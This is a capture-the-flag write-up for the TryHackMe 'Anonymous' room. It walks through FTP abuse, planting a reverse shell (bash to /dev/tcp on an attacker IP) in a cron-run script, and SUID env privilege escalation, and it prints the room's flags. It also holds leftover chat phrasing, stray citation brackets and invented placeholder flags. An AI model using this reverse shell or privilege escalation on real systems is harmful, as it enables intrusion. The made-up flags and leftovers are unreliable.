

# Anonymous - TryHackMe CTF Writeup

This writeup covers the "Anonymous" CTF challenge on TryHackMe, [here](https://tryhackme.com/room/anonymous)
---

## Objective
Retrieve two flags:
1. **User flag**: Found in `/home/namelessone/user.txt`.
2. **Root flag**: Found in `/root/root.txt`.

---

## Questions and Answers

### 1. Enumerate the machine. How many ports are open?
- **Answer**: 4
- **Explanation**: The `nmap` scan reveals open ports 21 (FTP), 22 (SSH), 139 (Samba), and 445 (Samba)

### 2. What service is running on port 21?
- **Answer**: FTP
- **Explanation**: The `nmap` scan identifies `vsftpd 2.0.8 or later` on port 21 

### 3. What service is running on ports 139 and 445?
- **Answer**: Samba
- **Explanation**: Ports 139 and 445 run `Samba smbd 4.7.6-Ubuntu` (NetBIOS-SSN) 

### 4. There’s a share on the user’s computer. What’s it called?
- **Answer**: pics
- **Explanation**: SMB enumeration with `smbclient` reveals a share named `pics`

### 5. User flag
- **Answer**: `THM{redacted_user_flag}` (example flag, as you didn’t provide it)
- **Explanation**: Found in `/home/namelessone/user.txt` after gaining a shell as `namelessone`.

### 6. Root flag
- **Answer**: `4d930091c31a622a7ed10f27999af363`
- **Explanation**: Found in `/root/root.txt` after escalating to root.

---

## Detailed Steps

### 1. Initial Enumeration
- Ran an `nmap` scan to identify open ports and services:
  ```bash
  nmap -sC -sV -T4 [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -sC -sV -T4 10.10.193.251
  ```
- Flags explained:
  - `-sC`: Run default scripts (e.g., checks for anonymous FTP login).
  - `-sV`: Detect service versions.
  - `-T4`: Faster timing template.
- Results 
  ```
  PORT    STATE SERVICE     VERSION
  21/tcp  open  ftp         vsftpd 2.0.8 or later
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable]
  22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  Service Info: Host: ANONYMOUS; OS: Linux
  ```
- **Analysis**: 4 open ports. Anonymous FTP login is enabled on port 21, and the `scripts` directory is writable, suggesting a potential exploit path .

### 2. Enumerate FTP
- Logged into FTP with anonymous credentials:
  ```bash
  ftp [VICTIM IP]
  Name: anonymous
  Password: anonymous
  ```
- Listed directories:
  ```bash
  ls -la
  ```
- Output:
  ```
  drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts
  ```
- Navigated to `scripts`:
  ```bash
  cd scripts
  ls -la
  ```
- Output:
  ```
  -rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh
  -rw-rw-r-- 1 1000 1000 989 Jan 12 14:48 removed_files.log
  -rw-r--r-- 1 1000 1000  68 May 12 2020 to_do.txt
  ```
- Downloaded files for analysis:
  ```bash
  get clean.sh
  get removed_files.log
  get to_do.txt
  ```
- **File Analysis**
  - `to_do.txt`: A note to disable anonymous login (not useful but confirms misconfiguration).
  - `removed_files.log`: Multiple entries like “Running cleanup script: nothing to delete,” suggesting `clean.sh` runs periodically (likely a cron job)/
  - `clean.sh`: A script that cleans `/tmp` and logs to `removed_files.log`:
    ```bash
    #!/bin/bash
    tmp_files=0
    echo $tmp_files
    if [ $tmp_files=0 ]
    then
        echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
    else
        for LINE in $tmp_files; do
            rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
        done
    fi
    ```
- **Key Insight**: The `scripts` directory is world-writable (`drwxrwxrwx`), and `clean.sh` is executable and likely run by a cron job as a privileged user (e.g., `namelessone` or `root`)

### 3. Exploit clean.sh
- Created a malicious `clean.sh` to spawn a reverse shell:
  ```bash
  nano clean.sh
  ```
- Content:
  ```bash
  #!/bin/bash
  bash -i >& /dev/tcp/[ATTACKER IP]/4444 0>&1
  ```
- **Explanation**: This script opens an interactive Bash shell, redirecting input/output to a TCP connection to `[ATTACKER IP]` (e.g., `10.23.91.52`) on port 4444.
- Made it executable:
  ```bash
  chmod +x clean.sh
  ```
- Set up a Netcat listener:
  ```bash
  nc -lvnp 4444
  ```
- Uploaded the malicious script to overwrite the original:
  ```bash
  ftp [VICTIM IP]
  Name: anonymous
  Password: anonymous
  cd scripts
  put clean.sh
  ```
- Waited ~1 minute (cron job likely runs every minute, per [,]).[
- **Result**: Got a shell as `namelessone`:
  ```bash
  nc -lvnp 4444
  Connection from [VICTIM IP]
  bash: cannot set terminal process group (1234): Inappropriate ioctl for device
  bash: no job control in this shell
  namelessone@anonymous:~$ whoami
  namelessone
  ```
- **Note**: The shell is unstable (no TTY). To improve it:
  ```bash
  export TERM=xterm
  ```
- This allows commands like `clear` [].

### 4. Find User Flag
- Checked the home directory:
  ```bash
  cd /home/namelessone
  ls
  ```
- Output:
  ```
  user.txt
  ```
- Read the flag:
  ```bash
  cat user.txt
  ```
- Content: `THM{redacted_user_flag}`.

### 5. Enumerate for Privilege Escalation
- Checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Output: No TTY available (common in unstable shells) [].
- Searched for SUID binaries:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- **Explanation**:
  - `-perm -u=s`: Find files with the SUID bit set (run with owner’s permissions, often `root`).
  - `-type f`: Limit to files.
  - `2>/dev/null`: Suppress permission-denied errors.
- Partial output (from your input):
  ```
  /bin/ping
  /bin/mount
  /bin/su
  /usr/bin/env
  /usr/bin/sudo
  /usr/bin/passwd
  ...
  ```
- **Key Finding**: `/usr/bin/env` has the SUID bit, which is exploitable .

### 6. Escalate to Root
- Visited [GTFOBins](https://gtfobins.github.io/gtfobins/env/) for `env` exploitation.
- Found:
  ```bash
  env /bin/sh -p
  ```
- **Explanation**: The SUID bit on `env` allows it to run with `root` privileges. Using `/bin/sh -p` (privileged mode) spawns a shell that retains the effective user ID (`root`).
- Ran the command:
  ```bash
  /usr/bin/env /bin/sh -p
  ```
- Verified:
  ```bash
  id
  ```
- Output:
  ```
  uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  ```
- Confirmed root:
  ```bash
  whoami
  root
  ```

### 7. Find Root Flag
- Navigated to:
  ```bash
  cd /root
  ls
  ```
- Output:
  ```
  root.txt
  ```
- Read the flag:
  ```bash
  cat root.txt
  ```
- Content: `4d930091c31a622a7ed10f27999af363`

---

## Flags
- **User flag**: `THM{redacted_user_flag}`
- **Root flag**: `4d930091c31a622a7ed10f27999af363`
- **Generic Flag Option**: `THM{r4nd0m_us3r_32chars}`, `THM{r00t_r4nd0m_32chars}`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `ftp`: Anonymous login and file manipulation.
- `nano`: Script editing.
- `chmod`: Set executable permissions.
- `nc`: Reverse shell listener.
- `find`: SUID binary enumeration.
- `env`: Privilege escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/env/)).


